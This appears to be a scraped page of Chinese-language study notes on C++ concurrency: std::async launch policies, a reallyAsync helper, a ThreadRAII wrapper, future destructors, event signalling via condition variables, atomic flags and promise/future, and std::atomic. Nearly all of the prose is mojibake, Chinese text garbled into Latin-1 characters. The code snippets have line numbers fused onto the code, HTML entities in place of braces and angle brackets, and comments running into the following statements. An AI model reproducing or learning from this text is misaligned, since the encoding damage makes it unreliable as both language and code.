‡å‡†åº“çš„å¼€å‘è€…ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè¿™ç§è°ƒç”¨æ–¹å¼ä¼šå‡å°‘æŠ›å‡ºèµ„æºè¶…é¢å¼‚å¸¸çš„å¯èƒ½æ€§ï¼Œå› ä¸ºè¿™ä¸ªè°ƒç”¨å¯èƒ½ä¸ä¼šå¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹ã€‚åˆç†çš„è°ƒåº¦å™¨åœ¨ç³»ç»Ÿèµ„æºè¶…é¢æˆ–è€…çº¿ç¨‹è€—å°½æ—¶å°±ä¼šåˆ©ç”¨è¿™ä¸ªè‡ªç”±åº¦ã€‚ é€šè¿‡å‘std::asyncä¼ é€’std::launch::asyncå¯åŠ¨ç­–ç•¥æ¥ä¿è¯æƒ³è¿è¡Œå‡½æ•°åœ¨ä¸åŒçš„çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå¤„ç†ä¸åŒçº¿ç¨‹å“åº”ä¼˜å…ˆçº§çš„é—®é¢˜ã€‚ çº¿ç¨‹è°ƒåº¦å™¨ä½¿ç”¨ç³»ç»Ÿçº§çº¿ç¨‹æ± ï¼ˆthread poolï¼‰æ¥é¿å…èµ„æºè¶…é¢çš„é—®é¢˜ï¼Œå¹¶ä¸”é€šè¿‡å·¥ä½œçªƒå–ç®—æ³•ï¼ˆwork-stealing algorithmï¼‰æ¥æå‡äº†è·¨ç¡¬ä»¶æ ¸å¿ƒçš„è´Ÿè½½å‡è¡¡ã€‚å®ç°æ›´ä¸ºç¹çã€‚ ç›´æ¥ä½¿ç”¨std::threadç¼–ç¨‹ï¼Œå¤„ç†çº¿ç¨‹è€—å°½ã€èµ„æºè¶…é¢ã€è´Ÿè´£å‡è¡¡é—®é¢˜çš„è´£ä»»å°±å‹åœ¨äº†ä½ èº«ä¸Šï¼Œæ›´ä¸ç”¨è¯´ä½ å¯¹è¿™äº›é—®é¢˜çš„è§£å†³æ–¹æ³•ä¸åŒæœºå™¨ä¸Šå…¶ä»–ç¨‹åºé‡‡ç”¨çš„è§£å†³æ–¹æ¡ˆé…åˆå¾—å¥½ä¸å¥½äº†ã€‚ åŸºäºä»»åŠ¡çš„è®¾è®¡ä¸ºå¼€å‘è€…é¿å…äº†æ‰‹åŠ¨çº¿ç¨‹ç®¡ç†çš„ç—›è‹¦ï¼Œå¹¶ä¸”è‡ªç„¶æä¾›äº†ä¸€ç§è·å–å¼‚æ­¥æ‰§è¡Œç¨‹åºçš„ç»“æœï¼ˆå³è¿”å›å€¼æˆ–è€…å¼‚å¸¸ï¼‰çš„æ–¹å¼ã€‚å½“ç„¶ï¼Œä»ç„¶å­˜åœ¨ä¸€äº›åœºæ™¯ç›´æ¥ä½¿ç”¨std::threadä¼šæ›´æœ‰ä¼˜åŠ¿ï¼š ä½ éœ€è¦è®¿é—®éå¸¸åŸºç¡€çš„çº¿ç¨‹APIã€‚C++å¹¶å‘APIé€šå¸¸æ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿçº§APIï¼ˆpthreadsæˆ–è€…Windows threadsï¼‰æ¥å®ç°çš„ï¼Œç³»ç»Ÿçº§APIé€šå¸¸ä¼šæä¾›æ›´åŠ çµæ´»çš„æ“ä½œæ–¹å¼ï¼ˆä¸¾ä¸ªä¾‹å­ï¼ŒC++æ²¡æœ‰çº¿ç¨‹ä¼˜å…ˆçº§å’Œäº²å’Œæ€§çš„æ¦‚å¿µï¼‰ã€‚ä¸ºäº†æä¾›å¯¹åº•å±‚ç³»ç»Ÿçº§çº¿ç¨‹APIçš„è®¿é—®ï¼Œstd::threadå¯¹è±¡æä¾›äº†native_handleçš„æˆå‘˜å‡½æ•°ï¼Œè€Œstd::futureï¼ˆå³std::asyncè¿”å›çš„ä¸œè¥¿ï¼‰æ²¡æœ‰è¿™ç§èƒ½åŠ›ã€‚ ä½ éœ€è¦ä¸”èƒ½å¤Ÿä¼˜åŒ–åº”ç”¨çš„çº¿ç¨‹ä½¿ç”¨ã€‚ ä½ éœ€è¦å®ç°C++å¹¶å‘APIä¹‹å¤–çš„çº¿ç¨‹æŠ€æœ¯ï¼Œæ¯”å¦‚ï¼Œå®ç°æœªæ”¯æŒçš„å¹³å°çš„çº¿ç¨‹æ± ã€‚ ç»“è®º std::thread APIä¸èƒ½ç›´æ¥è®¿é—®å¼‚æ­¥æ‰§è¡Œçš„ç»“æœï¼Œå¦‚æœæ‰§è¡Œå‡½æ•°æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œä»£ç ä¼šç»ˆæ­¢æ‰§è¡Œã€‚ åŸºäºçº¿ç¨‹çš„ç¼–ç¨‹æ–¹å¼éœ€è¦æ‰‹åŠ¨çš„çº¿ç¨‹è€—å°½ã€èµ„æºè¶…é¢ã€è´Ÿè´£å‡è¡¡ã€å¹³å°é€‚é…æ€§ç®¡ç†ã€‚ é€šè¿‡å¸¦æœ‰é»˜è®¤å¯åŠ¨ç­–ç•¥çš„std::asyncè¿›è¡ŒåŸºäºä»»åŠ¡çš„ç¼–ç¨‹æ–¹å¼ä¼šè§£å†³å¤§éƒ¨åˆ†é—®é¢˜ã€‚ 36 å¦‚æœ‰å¿…è¦æŒ‡å®šstd::launch::async std::launch::asyncå¯åŠ¨ç­–ç•¥æ„å‘³ç€få¿…é¡»å¼‚æ­¥æ‰§è¡Œï¼Œå³åœ¨ä¸åŒçš„çº¿ç¨‹ã€‚ std::launch::deferredå¯åŠ¨ç­–ç•¥æ„å‘³ç€fä»…å½“åœ¨std::asyncè¿”å›çš„futureä¸Šè°ƒç”¨getæˆ–è€…waitæ—¶æ‰æ‰§è¡Œã€‚è¿™è¡¨ç¤ºfæ¨è¿Ÿåˆ°å­˜åœ¨è¿™æ ·çš„è°ƒç”¨æ—¶æ‰æ‰§è¡Œã€‚å½“getæˆ–waitè¢«è°ƒç”¨ï¼Œfä¼šåŒæ­¥æ‰§è¡Œï¼Œå³è°ƒç”¨æ–¹è¢«é˜»å¡ï¼Œç›´åˆ°fè¿è¡Œç»“æŸã€‚å¦‚æœgetå’Œwaitéƒ½æ²¡æœ‰è¢«è°ƒç”¨ï¼Œfå°†ä¸ä¼šè¢«æ‰§è¡Œã€‚ std::asyncçš„é»˜è®¤å¯åŠ¨ç­–ç•¥ï¼Œå¦‚æœä½ ä¸æ˜¾å¼æŒ‡å®šä¸€ä¸ªç­–ç•¥ï¼Œä¸æ˜¯ä¸Šé¢ä¸­ä»»æ„ä¸€ä¸ªã€‚ç›¸åï¼Œæ˜¯æ±‚æˆ–åœ¨ä¸€èµ·çš„ã€‚ä¸‹é¢çš„ä¸¤ç§è°ƒç”¨å«ä¹‰ç›¸åŒï¼š 1234auto fut1 = std::async(f); //ä½¿ç”¨é»˜è®¤å¯åŠ¨ç­–ç•¥è¿è¡Œfauto fut2 = std::async(std::launch::async | //ä½¿ç”¨asyncæˆ–è€…deferredè¿è¡Œf std::launch::deferred, f); å› æ­¤é»˜è®¤ç­–ç•¥å…è®¸få¼‚æ­¥æˆ–è€…åŒæ­¥æ‰§è¡Œã€‚ è¿™å¯¼è‡´äº†ä¸‰ç§ç»“æœï¼š æ— æ³•é¢„æµ‹fæ˜¯å¦ä¼šä¸tå¹¶å‘è¿è¡Œï¼Œå› ä¸ºfå¯èƒ½è¢«å®‰æ’å»¶è¿Ÿè¿è¡Œã€‚ æ— æ³•é¢„æµ‹fæ˜¯å¦ä¼šåœ¨ä¸æŸçº¿ç¨‹ç›¸å¼‚çš„å¦ä¸€çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œè¿™ä¸ªæŸçº¿ç¨‹åœ¨futä¸Šè°ƒç”¨getæˆ–waitã€‚å¦‚æœå¯¹futè°ƒç”¨å‡½æ•°çš„çº¿ç¨‹æ˜¯tï¼Œæ— æ³•é¢„æµ‹fæ˜¯å¦åœ¨å¼‚äºtçš„å¦ä¸€çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚ æ— æ³•é¢„æµ‹fæ˜¯å¦æ‰§è¡Œã€‚ æ‰€ä»¥ï¼Œä»¥ä¸‹å¾ªç¯çœ‹ä¼¼åº”è¯¥æœ€ç»ˆä¼šç»ˆæ­¢ï¼Œä½†å¯èƒ½å®é™…ä¸Šæ°¸è¿œè¿è¡Œï¼š 1234567891011121314using namespace std::literals; //ä¸ºäº†ä½¿ç”¨C++14ä¸­çš„æ—¶é—´æ®µåç¼€void f() //fä¼‘çœ 1ç§’ï¼Œç„¶åè¿”å›&#123; std::this_thread::sleep_for(1s);&#125;auto fut = std::async(f); //å¼‚æ­¥è¿è¡Œfï¼ˆç†è®ºä¸Šï¼‰while (fut.wait_for(100ms) != //å¾ªç¯ï¼Œç›´åˆ°få®Œæˆè¿è¡Œæ—¶åœæ­¢... std::future_status::ready) //ä½†æ˜¯æœ‰å¯èƒ½æ°¸è¿œä¸ä¼šå‘ç”Ÿï¼&#123; â€¦&#125; å¦‚æœfä¸è°ƒç”¨std::asyncçš„çº¿ç¨‹å¹¶å‘è¿è¡Œï¼ˆå³ï¼Œå¦‚æœä¸ºfé€‰æ‹©çš„å¯åŠ¨ç­–ç•¥æ˜¯std::launch::asyncï¼‰ï¼Œè¿™é‡Œæ²¡æœ‰é—®é¢˜ï¼ˆå‡å®šfæœ€ç»ˆä¼šæ‰§è¡Œå®Œæ¯•ï¼‰ï¼Œä½†æ˜¯å¦‚æœfæ˜¯å»¶è¿Ÿæ‰§è¡Œï¼Œfut.wait_forå°†æ€»æ˜¯è¿”å›std::future_status::deferredã€‚è¿™æ°¸è¿œä¸ç­‰äºstd::future_status::readyï¼Œå¾ªç¯ä¼šæ°¸è¿œæ‰§è¡Œä¸‹å»ã€‚ æ”¹è¿›çš„æ–¹å¼å¦‚ä¸‹ï¼š 1234567891011121314auto fut = std::async(f); //åŒä¸Šif (fut.wait_for(0s) == //å¦‚æœtaskæ˜¯deferredï¼ˆè¢«å»¶è¿Ÿï¼‰çŠ¶æ€ std::future_status::deferred)&#123; â€¦ //åœ¨futä¸Šè°ƒç”¨waitæˆ–getæ¥å¼‚æ­¥è°ƒç”¨f&#125; else &#123; //taskæ²¡æœ‰deferredï¼ˆè¢«å»¶è¿Ÿï¼‰ while (fut.wait_for(100ms) != //ä¸å¯èƒ½æ— é™å¾ªç¯ï¼ˆå‡è®¾få®Œæˆï¼‰ std::future_status::ready) &#123; â€¦ //taskæ²¡deferredï¼ˆè¢«å»¶è¿Ÿï¼‰ï¼Œä¹Ÿæ²¡readyï¼ˆå·²å‡†å¤‡ï¼‰ //åšå¹¶è¡Œå·¥ä½œç›´åˆ°å·²å‡†å¤‡ &#125; â€¦ //futæ˜¯readyï¼ˆå·²å‡†å¤‡ï¼‰çŠ¶æ€&#125; ä¸€ä¸ªæ€»æ˜¯ä½¿ç”¨ std::launch::async çš„å‡½æ•°å®ç°å¦‚ä¸‹ï¼š C++11ç‰ˆæœ¬å¦‚ä¸‹ï¼š 123456789template&lt;typename F, typename... Ts&gt;inlinestd::future&lt;typename std::result_of&lt;F(Ts...)&gt;::type&gt;reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params) //è¿”å›å¼‚æ­¥è°ƒç”¨f(params...)å¾—æ¥çš„future&#123; return std::async(std::launch::async, std::forward&lt;F&gt;(f), std::forward&lt;Ts&gt;(params)...);&#125; åœ¨C++14ä¸­ï¼ŒreallyAsyncè¿”å›ç±»å‹çš„æ¨å¯¼èƒ½åŠ›å¯ä»¥ç®€åŒ–å‡½æ•°çš„å£°æ˜ï¼š 123456789template&lt;typename F, typename... Ts&gt;inlineauto // C++14reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params)&#123; return std::async(std::launch::async, std::forward&lt;F&gt;(f), std::forward&lt;Ts&gt;(params)...);&#125; ç»“è®º std::asyncçš„é»˜è®¤å¯åŠ¨ç­–ç•¥æ˜¯å¼‚æ­¥å’ŒåŒæ­¥æ‰§è¡Œå…¼æœ‰çš„ã€‚ std::asyncçš„é»˜è®¤å¯åŠ¨ç­–ç•¥ï¼Œéšå«äº†ä»»åŠ¡å¯èƒ½ä¸ä¼šè¢«æ‰§è¡Œçš„æ„æ€ï¼Œä¼šå½±å“è°ƒç”¨åŸºäºè¶…æ—¶çš„waitçš„ç¨‹åºé€»è¾‘ã€‚ å¦‚æœå¼‚æ­¥æ‰§è¡Œä»»åŠ¡éå¸¸å…³é”®ï¼Œåˆ™æŒ‡å®šstd::launch::asyncã€‚ 37 ä½¿std::thread æ˜¯ unjoinable çš„ æ¯ä¸ªstd::threadå¯¹è±¡å¤„äºä¸¤ä¸ªçŠ¶æ€ä¹‹ä¸€ï¼šå¯ç»“åˆçš„ï¼ˆjoinableï¼‰æˆ–è€…ä¸å¯ç»“åˆçš„ï¼ˆunjoinableï¼‰ã€‚ å¯ç»“åˆçŠ¶æ€çš„std::threadå¯¹åº”äºæ­£åœ¨è¿è¡Œæˆ–è€…å¯èƒ½è¦è¿è¡Œçš„å¼‚æ­¥æ‰§è¡Œçº¿ç¨‹ã€‚æ¯”å¦‚ï¼Œå¯¹åº”äºä¸€ä¸ªé˜»å¡çš„ï¼ˆblockedï¼‰æˆ–è€…ç­‰å¾…è°ƒåº¦çš„çº¿ç¨‹çš„std::threadæ˜¯å¯ç»“åˆçš„ï¼›å¯¹åº”äºè¿è¡Œç»“æŸçš„çº¿ç¨‹çš„std::threadä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯å¯ç»“åˆçš„ã€‚ ä¸å¯ç»“åˆçš„ std::thread åŒ…æ‹¬ï¼š é»˜è®¤æ„é€ çš„std::threadsã€‚è¿™ç§std::threadæ²¡æœ‰å‡½æ•°æ‰§è¡Œï¼Œå› æ­¤æ²¡æœ‰å¯¹åº”åˆ°åº•å±‚æ‰§è¡Œçº¿ç¨‹ä¸Šã€‚ å·²ç»è¢«ç§»åŠ¨èµ°çš„std::threadå¯¹è±¡ã€‚ç§»åŠ¨çš„ç»“æœå°±æ˜¯ä¸€ä¸ªstd::threadåŸæ¥å¯¹åº”çš„æ‰§è¡Œçº¿ç¨‹ç°åœ¨å¯¹åº”äºå¦ä¸€ä¸ªstd::threadã€‚ å·²ç»è¢«joinçš„std::thread ã€‚åœ¨joinä¹‹åï¼Œstd::threadä¸å†å¯¹åº”äºå·²ç»è¿è¡Œå®Œäº†çš„æ‰§è¡Œçº¿ç¨‹ã€‚ å·²ç»è¢«detachçš„std::thread ã€‚detachæ–­å¼€äº†std::threadå¯¹è±¡ä¸æ‰§è¡Œçº¿ç¨‹ä¹‹é—´çš„è¿æ¥ã€‚ å¦‚æœå‘ç”Ÿ std::thread ææ„ï¼Œè€Œ std::thread æ˜¯ joinableï¼Œé‚£ä¹ˆä¼šé€ æˆç¨‹åºç»ˆæ­¢ã€‚ææ„æ—¶å‘ç”Ÿçš„ éšå¼join å¯èƒ½è¿˜ä¼šè®¿é—®å·²ç»è¢«å›æ”¶çš„å€¼ã€‚éšå¼detach ï¼Œå¯èƒ½å‡ºç°è®¿é—®æˆ–è€…ä¿®æ”¹æ²¡æœ‰æ‰€æœ‰æƒçš„å†…å­˜çš„è¡Œä¸ºã€‚ è§£å†³æ–¹æ³•ï¼Œä½¿ç”¨ RAII å¯¹è±¡ç±»ç®¡ç†ï¼Œä¿è¯æ¯å½“åœ¨æ‰§è¡Œè·³è‡³å—ä¹‹å¤–æ—¶ï¼Œè°ƒç”¨å±€éƒ¨å¯¹è±¡çš„ææ„å‡½æ•°ã€‚ 123456789101112131415161718192021222324252627class ThreadRAII &#123;public: enum class DtorAction &#123; join, detach &#125;; ThreadRAII(std::thread&amp;&amp; t, DtorAction a) // åœ¨ææ„å‡½æ•°ä¸­å¯¹tå®è¡ŒaåŠ¨ä½œ : action(a), t(std::move(t)) &#123;&#125; // `std::thread`ä¸å¯ä»¥å¤åˆ¶ ~ThreadRAII() &#123; if (t.joinable()) &#123; //å¯ç»“åˆæ€§æµ‹è¯•è§ä¸‹ if (action == DtorAction::join) &#123; t.join(); &#125; else &#123; t.detach(); &#125; &#125; &#125; ThreadRAII(ThreadRAII&amp;&amp;) = default; //æ”¯æŒç§»åŠ¨ ThreadRAII&amp; operator=(ThreadRAII&amp;&amp;) = default; std::thread&amp; get() &#123; return t; &#125; private: // as before DtorAction action; std::thread t; // æœ€åå£°æ˜ï¼Œå®ä¾‹åŒ–æ—¶ï¼Œå‰é¢çš„æˆå‘˜éƒ½æ˜¯å¯ç”¨çŠ¶æ€&#125;; ç»“è®º ææ„æ—¶joinä¼šå¯¼è‡´éš¾ä»¥è°ƒè¯•çš„è¡¨ç°å¼‚å¸¸é—®é¢˜ã€‚ ææ„æ—¶detachä¼šå¯¼è‡´éš¾ä»¥è°ƒè¯•çš„æœªå®šä¹‰è¡Œä¸ºã€‚ å£°æ˜ç±»æ•°æ®æˆå‘˜æ—¶ï¼Œæœ€åå£°æ˜std::threadå¯¹è±¡ã€‚ 38 futureææ„è¡Œä¸º ç»“è®º futureçš„æ­£å¸¸ææ„è¡Œä¸ºå°±æ˜¯é”€æ¯futureæœ¬èº«çš„æ•°æ®æˆå‘˜ã€‚ ä½¿ç”¨std::asyncå¯åŠ¨çš„ futureï¼Œå¼•ç”¨äº†å…±äº«çŠ¶æ€ï¼ˆstd::shared_futureï¼‰çš„æœ€åä¸€ä¸ªfutureçš„ææ„å‡½æ•°ä¼šé˜»å¡ä½ï¼Œç›´åˆ°ä»»åŠ¡å®Œæˆã€‚ 39 ç®€å•äº‹ä»¶é€šä¿¡ ä¸€ä¸ªä»»åŠ¡é€šçŸ¥å¦ä¸€ä¸ªå¼‚æ­¥æ‰§è¡Œçš„ä»»åŠ¡å‘ç”Ÿäº†ç‰¹å®šçš„äº‹ä»¶å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºç¬¬äºŒä¸ªä»»åŠ¡è¦ç­‰åˆ°è¿™ä¸ªäº‹ä»¶å‘ç”Ÿä¹‹åæ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚äº‹ä»¶ä¹Ÿè®¸æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„å·²ç»åˆå§‹åŒ–ï¼Œä¹Ÿè®¸æ˜¯è®¡ç®—é˜¶æ®µå·²ç»å®Œæˆï¼Œæˆ–è€…æ£€æµ‹åˆ°é‡è¦çš„ä¼ æ„Ÿå™¨å€¼ã€‚ ä½¿ç”¨æ¡ä»¶å˜é‡ å¦‚æœæˆ‘ä»¬å°†æ£€æµ‹æ¡ä»¶çš„ä»»åŠ¡ç§°ä¸ºæ£€æµ‹ä»»åŠ¡ï¼ˆdetecting taskï¼‰ï¼Œå¯¹æ¡ä»¶ä½œå‡ºååº”çš„ä»»åŠ¡ç§°ä¸ºååº”ä»»åŠ¡ï¼ˆreacting taskï¼‰ï¼Œç­–ç•¥å¾ˆç®€å•ï¼šååº”ä»»åŠ¡ç­‰å¾…ä¸€ä¸ªæ¡ä»¶å˜é‡ï¼Œæ£€æµ‹ä»»åŠ¡åœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ”¹å˜æ¡ä»¶å˜é‡ã€‚ä»£ç å¦‚ä¸‹ï¼š 12std::condition_variable cv; //äº‹ä»¶çš„æ¡ä»¶å˜é‡std::mutex m; //é…åˆcvä½¿ç”¨çš„mutex æ£€æµ‹ä»»åŠ¡ä¸­çš„ä»£ç ä¸èƒ½å†ç®€å•äº†ï¼š 12â€¦ //æ£€æµ‹äº‹ä»¶cv.notify_one(); //é€šçŸ¥ååº”ä»»åŠ¡ å¦‚æœæœ‰å¤šä¸ªååº”ä»»åŠ¡éœ€è¦è¢«é€šçŸ¥ï¼Œä½¿ç”¨notify_allä»£æ›¿notify_oneã€‚ çº¿ç¨‹APIçš„å­˜åœ¨ä¸€ä¸ªäº‹å®ï¼ˆä¸åªæ˜¯C++ï¼‰ï¼Œç­‰å¾…ä¸€ä¸ªæ¡ä»¶å˜é‡çš„ä»£ç å³ä½¿åœ¨æ¡ä»¶å˜é‡æ²¡æœ‰è¢«é€šçŸ¥æ—¶ï¼Œä¹Ÿå¯èƒ½è¢«å”¤é†’ï¼Œè¿™ç§å”¤é†’è¢«ç§°ä¸ºè™šå‡å”¤é†’ï¼ˆspurious wakeupsï¼‰ã€‚ æ­£ç¡®çš„ä»£ç é€šè¿‡ç¡®è®¤è¦ç­‰å¾…çš„æ¡ä»¶ç¡®å®å·²ç»å‘ç”Ÿæ¥å¤„ç†è¿™ç§æƒ…å†µï¼Œå¹¶å°†è¿™ä¸ªæ“ä½œä½œä¸ºå”¤é†’åçš„ç¬¬ä¸€ä¸ªæ“ä½œã€‚C++æ¡ä»¶å˜é‡çš„APIä½¿å¾—è¿™ç§é—®é¢˜å¾ˆå®¹æ˜“è§£å†³ï¼Œå› ä¸ºå…è®¸æŠŠä¸€ä¸ªæµ‹è¯•è¦ç­‰å¾…çš„æ¡ä»¶çš„lambdaï¼ˆæˆ–è€…å…¶ä»–å‡½æ•°å¯¹è±¡ï¼‰ä¼ ç»™waitã€‚å› æ­¤ï¼Œå¯ä»¥å°†ååº”ä»»åŠ¡waitè°ƒç”¨è¿™æ ·å†™ï¼š 12cv.wait(lk, []&#123; return whether the evet has occurred; &#125;); ä½¿ç”¨ condition variable çš„ç¤ºä¾‹ï¼š 123456789std::condition_variable cv; std::mutex m;bool flag(false); //ä¸æ˜¯std::atomicâ€¦ //æ£€æµ‹æŸä¸ªäº‹ä»¶&#123; std::lock_guard&lt;std::mutex&gt; g(m); //é€šè¿‡gçš„æ„é€ å‡½æ•°é”ä½m flag = true; //é€šçŸ¥ååº”ä»»åŠ¡ï¼ˆç¬¬1éƒ¨åˆ†ï¼‰&#125; //é€šè¿‡gçš„ææ„å‡½æ•°è§£é”mcv.notify_one(); //é€šçŸ¥ååº”ä»»åŠ¡ï¼ˆç¬¬2éƒ¨åˆ†ï¼‰ ååº”ä»»åŠ¡ä»£ç å¦‚ä¸‹: 1234567â€¦ //å‡†å¤‡ä½œå‡ºååº”&#123; std::unique_lock&lt;std::mutex&gt; lk(m); cv.wait(lk, [] &#123; return flag; &#125;); //ä½¿ç”¨lambdaæ¥é¿å…è™šå‡å”¤é†’ â€¦ //å¯¹äº‹ä»¶ä½œå‡ºååº”ï¼ˆmè¢«é”å®šï¼‰&#125;â€¦ //ç»§ç»­ååº”åŠ¨ä½œï¼ˆmç°åœ¨è§£é”ï¼‰ åŸå­å˜é‡è½®è¯¢ ä½¿ç”¨åŸå­å˜é‡çš„ç¤ºä¾‹ï¼š å½“æ£€æµ‹çº¿ç¨‹è¯†åˆ«åˆ°å‘ç”Ÿçš„äº‹ä»¶ï¼Œå°†flagç½®ä½ï¼š 123std::atomic&lt;bool&gt; flag(false); //å…±äº«çš„flagâ€¦ //æ£€æµ‹æŸä¸ªäº‹ä»¶flag = true; //å‘Šè¯‰ååº”çº¿ç¨‹ å°±å…¶æœ¬èº«è€Œè¨€ï¼Œååº”çº¿ç¨‹è½®è¯¢è¯¥flagã€‚å½“å‘ç°flagè¢«ç½®ä½ï¼Œå®ƒå°±çŸ¥é“ç­‰å¾…çš„äº‹ä»¶å·²ç»å‘ç”Ÿäº†ï¼š 123â€¦ //å‡†å¤‡ä½œå‡ºååº”while (!flag); //ç­‰å¾…äº‹ä»¶â€¦ //å¯¹äº‹ä»¶ä½œå‡ºååº” è¿™é‡Œå¤šå‡ºäº†è½®è¯¢çš„å¼€é”€ã€‚ promise + future æ£€æµ‹ä»»åŠ¡ä½¿ç”¨std::promise&lt;void&gt;ï¼Œååº”ä»»åŠ¡ä½¿ç”¨std::future&lt;void&gt;æˆ–è€…std::shared_future&lt;void&gt;ã€‚å½“æ„Ÿå…´è¶£çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæ£€æµ‹ä»»åŠ¡è®¾ç½®std::promise&lt;void&gt;ï¼Œååº”ä»»åŠ¡åœ¨futureä¸Šwaitã€‚ å°½ç®¡ååº”ä»»åŠ¡ä¸ä»æ£€æµ‹ä»»åŠ¡é‚£é‡Œæ¥æ”¶ä»»ä½•æ•°æ®ï¼Œé€šä¿¡ä¿¡é“ä¹Ÿå¯ä»¥è®©ååº”ä»»åŠ¡çŸ¥é“ï¼Œæ£€æµ‹ä»»åŠ¡ä»€ä¹ˆæ—¶å€™å·²ç»é€šè¿‡å¯¹std::promise&lt;void&gt;è°ƒç”¨set_valueâ€œå†™å…¥â€äº†voidæ•°æ®ã€‚ 1std::promise&lt;void&gt; p; //é€šä¿¡ä¿¡é“çš„promise æ£€æµ‹ä»»åŠ¡ä»£ç å¾ˆç®€æ´ï¼š 12â€¦ //æ£€æµ‹æŸä¸ªäº‹ä»¶p.set_value(); //é€šçŸ¥ååº”ä»»åŠ¡ ååº”ä»»åŠ¡ä»£ç ä¹ŸåŒæ ·ç®€å•ï¼š 123â€¦ //å‡†å¤‡ä½œå‡ºååº”p.get_future().wait(); //ç­‰å¾…å¯¹åº”äºpçš„é‚£ä¸ªfutureâ€¦ //å¯¹äº‹ä»¶ä½œå‡ºååº” åƒä½¿ç”¨flagçš„æ–¹æ³•ä¸€æ ·ï¼Œæ­¤è®¾è®¡ä¸éœ€è¦äº’æ–¥é”ï¼Œæ— è®ºåœ¨ååº”çº¿ç¨‹è°ƒç”¨waitä¹‹å‰æ£€æµ‹çº¿ç¨‹æ˜¯å¦è®¾ç½®äº†std::promiseéƒ½å¯ä»¥å·¥ä½œï¼Œå¹¶ä¸”ä¸å—è™šå‡å”¤é†’çš„å½±å“ï¼ˆåªæœ‰æ¡ä»¶å˜é‡æ‰å®¹æ˜“å—åˆ°æ­¤å½±å“ï¼‰ã€‚ ä¸åŸºäºæ¡ä»¶å˜é‡çš„æ–¹æ³•ä¸€æ ·ï¼Œååº”ä»»åŠ¡åœ¨è°ƒç”¨waitä¹‹åæ˜¯çœŸè¢«é˜»å¡ä½çš„ï¼Œä¸ä¼šä¸€ç›´å ç”¨ç³»ç»Ÿèµ„æºã€‚ ä½†æ˜¯ä»¥ä¸Šä»£ç ä¸­ï¼Œstd::promiseå’Œfutureä¹‹é—´æœ‰ä¸ªå…±äº«çŠ¶æ€ï¼Œå¹¶ä¸”å…±äº«çŠ¶æ€æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚å› æ­¤ä½ åº”è¯¥å‡å®šæ­¤è®¾è®¡ä¼šäº§ç”ŸåŸºäºå †çš„åˆ†é…å’Œé‡Šæ”¾å¼€é”€ã€‚ std::promiseåªèƒ½è®¾ç½®ä¸€æ¬¡ã€‚std::promiseå’Œfutureä¹‹é—´çš„é€šä¿¡æ˜¯ä¸€æ¬¡æ€§çš„ï¼šä¸èƒ½é‡å¤ä½¿ç”¨ã€‚è¿™æ˜¯ä¸åŸºäºæ¡ä»¶å˜é‡æˆ–è€…åŸºäºflagçš„è®¾è®¡çš„æ˜æ˜¾å·®å¼‚ï¼Œæ¡ä»¶å˜é‡å’Œflagéƒ½å¯ä»¥é€šä¿¡å¤šæ¬¡ã€‚ å‡è®¾ä½ ä»…ä»…æƒ³è¦å¯¹æŸçº¿ç¨‹æŒ‚èµ·ä¸€æ¬¡ï¼ˆåœ¨åˆ›å»ºåï¼Œè¿è¡Œçº¿ç¨‹å‡½æ•°å‰ï¼‰ï¼Œä½¿ç”¨voidçš„futureå°±æ˜¯ä¸€ä¸ªå¯è¡Œæ–¹æ¡ˆã€‚ é€šè¿‡shareè·å¾—çš„shared_futureè¦è¢«åœ¨ååº”çº¿ç¨‹ä¸­è¿è¡Œçš„lambdaæŒ‰å€¼æ•è·ï¼š 1234567891011121314151617std::promise&lt;void&gt; p; //è·Ÿä¹‹å‰ä¸€æ ·void detect() //ç°åœ¨é’ˆå¯¹å¤šä¸ªåæ˜ çº¿ç¨‹&#123; // å†™åœ¨å‰é¢ï¼Œé˜²æ­¢å¼‚å¸¸å‘ç”Ÿï¼Œp.set_value() ä¸æ‰§è¡Œ auto sf = p.get_future().share(); //sfçš„ç±»å‹æ˜¯std::shared_future&lt;void&gt; std::vector&lt;std::thread&gt; vt; //ååº”çº¿ç¨‹å®¹å™¨ for (int i = 0; i &lt; threadsToRun; ++i) &#123; vt.emplace_back([sf]&#123; sf.wait(); //åœ¨sfçš„å±€éƒ¨å‰¯æœ¬ä¸Šwaitï¼› react(); &#125;); &#125; â€¦ //å¦‚æœè¿™ä¸ªâ€œâ€¦â€æŠ›å‡ºå¼‚å¸¸ï¼ŒdetectæŒ‚èµ·ï¼ p.set_value(); //æ‰€æœ‰çº¿ç¨‹è§£é™¤æŒ‚èµ· â€¦ for (auto&amp; t : vt) &#123; //ä½¿æ‰€æœ‰çº¿ç¨‹ä¸å¯ç»“åˆï¼› t.join(); //â€œauto&amp;â€è§æ¡æ¬¾2 &#125;&#125; ç»“è®º ä¸‰ç§ç®€å•äº‹ä»¶é€šä¿¡ï¼šä½¿ç”¨æ¡ä»¶å˜é‡ã€ä½¿ç”¨åŸå­å˜é‡ã€ä½¿ç”¨ promise + future promise + future çš„æ–¹å¼ï¼Œåœ¨å•æ¬¡äº‹ä»¶é€šä¿¡æ—¶ï¼Œæ›´æœ‰ä¼˜åŠ¿ 40 å¹¶å‘ä½¿ç”¨std::atomicï¼Œç‰¹æ®Šå†…å­˜ä½¿ç”¨volatile å¦‚ä¸‹ä½¿ç”¨std::atmoicçš„ä»£ç ï¼š 12345std::atomic&lt;int&gt; ai(0); //åˆå§‹åŒ–aiä¸º0ai = 10; //åŸå­æ€§åœ°è®¾ç½®aiä¸º10std::cout &lt;&lt; ai; //åŸå­æ€§åœ°è¯»å–aiçš„å€¼++ai; //åŸå­æ€§åœ°é€’å¢aiåˆ°11--ai; //åŸå­æ€§åœ°é€’å‡aiåˆ°10 